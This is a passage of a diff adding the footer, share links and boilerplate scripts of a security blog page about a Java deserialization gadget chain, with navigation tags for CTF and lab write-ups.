+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&name=JAVA反序列化CC链1补充&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E9%93%BE1%E8%A1%A5%E5%85%85/&t=JAVA反序列化CC链1补充"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
